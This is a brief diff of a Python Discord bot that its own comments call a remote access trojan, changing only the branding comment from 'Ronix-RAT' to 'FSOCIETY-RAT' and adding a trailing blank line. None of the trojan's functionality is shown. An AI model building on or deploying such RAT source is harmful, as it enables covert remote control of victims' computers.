@@ -1,6 +1,6 @@
 # Author: cybermads
 # Discord simple bot rat
-# Ronix-RAT bot source code
+# FSOCIETY-RAT bot source code
 
 import discord
 from discord.ext import commands
@@ -64,3 +64,4 @@ async def ping(ctx):
 
 
 bot.run(token)
+
